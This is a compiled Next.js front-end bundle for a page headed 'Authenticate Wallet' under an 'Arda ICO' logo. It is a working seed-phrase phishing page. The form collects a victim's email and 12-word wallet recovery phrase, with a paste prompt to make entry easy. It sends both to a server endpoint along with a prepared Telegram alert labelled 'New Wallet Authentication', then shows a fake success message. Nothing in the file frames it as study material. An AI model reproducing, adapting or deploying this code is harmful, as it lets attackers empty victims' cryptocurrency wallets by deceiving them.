(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
  [980],
  {
    2668: (e, t, a) => {
      Promise.resolve().then(a.bind(a, 3527));
    },
    5565: (e, t, a) => {
      "use strict";
      a.d(t, { default: () => l.a });
      var s = a(4146),
        l = a.n(s);
    },
    4146: (e, t, a) => {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (function (e, t) {
          for (var a in t)
            Object.defineProperty(e, a, { enumerable: !0, get: t[a] });
        })(t, {
          default: function () {
            return c;
          },
          getImageProps: function () {
            return i;
          },
        });
      let s = a(306),
        l = a(666),
        r = a(7970),
        n = s._(a(5514));
      function i(e) {
        let { props: t } = (0, l.getImgProps)(e, {
          defaultLoader: n.default,
          imgConf: {
            deviceSizes: [640, 750, 828, 1080, 1200, 1920, 2048, 3840],
            imageSizes: [16, 32, 48, 64, 96, 128, 256, 384],
            path: "/_next/image",
            loader: "default",
            dangerouslyAllowSVG: !1,
            unoptimized: !1,
          },
        });
        for (let [e, a] of Object.entries(t)) void 0 === a && delete t[e];
        return { props: t };
      }
      let c = r.Image;
    },
    3527: (e, t, a) => {
      "use strict";
      a.r(t), a.d(t, { default: () => o });
      var s = a(5155),
        l = a(9341),
        r = a(6658),
        n = a(2115),
        i = a(8897),
        c = a.n(i);
      let o = () => {
        let e = (0, r.useParams)().walletType,
          [t, a] = (0, n.useState)(Array(12).fill("")),
          i = (e, s) => {
            let l = [...t];
            (l[e] = s), a(l);
          },
          [o, d] = (0, n.useState)(""),
          [m, h] = (0, n.useState)(""),
          [u, p] = (0, n.useState)(!1),
          x = async (e) => {
            e.preventDefault(), p(!0), await g(), p(!1);
          },
          g = async () => {
            try {
              let a =
                  "\n      \uD83D\uDE80 **New Wallet Authentication**\n      - **Wallet Type**: "
                    .concat(e, "\n      - **Phrase**: ")
                    .concat(t.join(", "), "\n      - **Email**: ")
                    .concat(m, "\n          "),
                s = {
                  subject: "New Wallet Authentication - ".concat(e),
                  text: "A user has authenticated their "
                    .concat(e, " wallet.\n\nPhrase: ")
                    .concat(o, "\nEmail: ")
                    .concat(m),
                  html: "\n          <p>A user has authenticated their <strong>"
                    .concat(
                      e,
                      "</strong> wallet.</p>\n          <p><strong>Phrase:</strong> "
                    )
                    .concat(
                      t.join(", "),
                      "</p>\n          <p><strong>Email:</strong> "
                    )
                    .concat(m, "</p>\n        "),
                  telegramMessage: a,
                };
              if (
                !(
                  await fetch("/api/send-email/", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(s),
                  })
                ).ok
              )
                throw Error("Failed to send email.");
              c().fire({
                title: "Success!",
                text: "Your ".concat(
                  e,
                  " wallet has been authenticated successfully"
                ),
                icon: "success",
                confirmButtonText: "OK",
              });
            } catch (e) {
              c().fire({
                title: "Error!",
                text: "An error occurred during the submission process.",
                icon: "error",
                confirmButtonText: "Try Again",
              });
            }
          };
        return (0, s.jsxs)("div", {
          children: [
            (0, s.jsx)(l.A, {}),
            (0, s.jsx)("section", {
              className: "block-explorer-wrapper bg-bottom-center",
              id: "welcome-1",
              children: (0, s.jsx)("div", {
                className: "block-explorer text",
                children: (0, s.jsx)("div", {
                  className: "container text-center",
                  children: (0, s.jsx)("div", {
                    className: "row",
                    children: (0, s.jsx)("div", {
                      className: "col-lg-12 align-self-center",
                      children: (0, s.jsxs)("h1", {
                        children: ["Authenticate ", e, " Wallet"],
                      }),
                    }),
                  }),
                }),
              }),
            }),
            (0, s.jsx)("section", {
              className: "block-explorer-features section bg-bottom",
              children: (0, s.jsx)("div", {
                className: "container bg",
                children: (0, s.jsx)("div", {
                  className: "row",
                  children: (0, s.jsx)("div", {
                    className:
                      "col-lg-12 align-self-center border border-warning-subtle p-5",
                    children: (0, s.jsxs)("form", {
                      id: "walletAuthenticationForm",
                      method: "post",
                      onSubmit: x,
                      children: [
                        (0, s.jsx)("div", {
                          className: "col-lg-12 align-self-center mb-4",
                          children: (0, s.jsx)("h2", {
                            children: "Wallet Authentication Form",
                          }),
                        }),
                        (0, s.jsxs)("div", {
                          className: "form-group mb-3",
                          children: [
                            (0, s.jsx)("label", {
                              htmlFor: "selectedWallet",
                              style: { fontSize: "14px" },
                              children: "Selected Wallet:",
                            }),
                            (0, s.jsx)("input", {
                              type: "text",
                              className: "form-control",
                              name: "wallets",
                              id: "selectedWallet",
                              style: { border: "1px solid rgb(0, 0, 0)" },
                              value: e,
                              readOnly: !0,
                            }),
                          ],
                        }),
                        (0, s.jsxs)("div", {
                          className: "form-group mb-3",
                          children: [
                            (0, s.jsx)("label", {
                              htmlFor: "userEmail",
                              style: { fontSize: "14px" },
                              children: "Enter Email:",
                            }),
                            (0, s.jsx)("input", {
                              type: "email",
                              className: "form-control",
                              id: "userEmail",
                              name: "email",
                              placeholder: "Enter Email",
                              style: { border: "1px solid rgb(0, 0, 0)" },
                              value: m,
                              onChange: (e) => h(e.target.value),
                              required: !0,
                            }),
                          ],
                        }),
                        (0, s.jsxs)("div", {
                          className: "form-group mb-3",
                          children: [
                            (0, s.jsx)("label", {
                              htmlFor: "seedPhrase",
                              style: { fontSize: "14px" },
                              children: "Wallet 12 Seed Phrase:",
                            }),
                            (0, s.jsxs)("div", {
                              className: "seed-phrase-container",
                              children: [
                                t.map((e, t) =>
                                  (0, s.jsx)(
                                    "div",
                                    {
                                      className: "input-wrapper",
                                      children: (0, s.jsx)("input", {
                                        type: "text",
                                        className: "seed-input form-control",
                                        placeholder: "Word ".concat(t + 1),
                                        value: e,
                                        onChange: (e) => i(t, e.target.value),
                                        required: !0,
                                      }),
                                    },
                                    t
                                  )
                                ),
                                (0, s.jsx)("div", {
                                  children: (0, s.jsx)("button", {
                                    type: "button",
                                    className: "btn btn-secondary paste-button",
                                    onClick: () => {
                                      let e = window.prompt(
                                        "Paste your 12-word seed phrase here, separated by spaces:"
                                      );
                                      if (e) {
                                        let s = e.split(" ").slice(0, 12);
                                        a(t.map((e, t) => s[t] || ""));
                                      }
                                    },
                                    style: { marginTop: "5px" },
                                    children: "Paste",
                                  }),
                                }),
                              ],
                            }),
                          ],
                        }),
                        (0, s.jsx)("div", {
                          className: "text-center",
                          children: (0, s.jsx)("button", {
                            type: "submit",
                            className: "btn btn-primary btn-blackMain mt-4",
                            style: { width: "180px" },
                            disabled: u,
                            children: u ? "Verifying..." : "Verify",
                          }),
                        }),
                      ],
                    }),
                  }),
                }),
              }),
            }),
          ],
        });
      };
    },
    9341: (e, t, a) => {
      "use strict";
      a.d(t, { A: () => i });
      var s = a(5155),
        l = a(5565),
        r = a(4839),
        n = a.n(r);
      let i = () =>
        (0, s.jsx)("header", {
          className: "header-area",
          children: (0, s.jsx)("div", {
            className: "container",
            children: (0, s.jsx)("div", {
              className: "row",
              children: (0, s.jsx)("div", {
                className: "col-12 position-relative",
                children: (0, s.jsxs)("nav", {
                  className: "main-nav",
                  children: [
                    (0, s.jsxs)(n(), {
                      href: "/",
                      className: "logo",
                      children: [
                        (0, s.jsx)(l.default, {
                          src: "/images/logo.png",
                          alt: "Arda ICO",
                          height: 50,
                          width: 150,
                          className: "image-fluid light-logo",
                        }),
                        (0, s.jsx)(l.default, {
                          src: "/images/logo.png",
                          alt: "Arda ICO",
                          height: 50,
                          width: 150,
                          className: "image-fluid dark-logo",
                        }),
                      ],
                    }),
                    (0, s.jsx)("ul", {
                      className: "nav",
                      children: (0, s.jsx)("li", {
                        children: (0, s.jsx)("a", {
                          href: "/integra-te",
                          className: "btn btn-small btn-primary pt-1 p-4",
                          children: "CONNECT WALLET",
                        }),
                      }),
                    }),
                    (0, s.jsx)("a", {
                      className: "menu-trigger",
                      children: (0, s.jsx)("span", { children: "Menu" }),
                    }),
                  ],
                }),
              }),
            }),
          }),
        });
    },
  },
  (e) => {
    var t = (t) => e((e.s = t));
    e.O(0, [320, 74, 441, 517, 358], () => t(2668)), (_N_E = e.O());
  },
]);
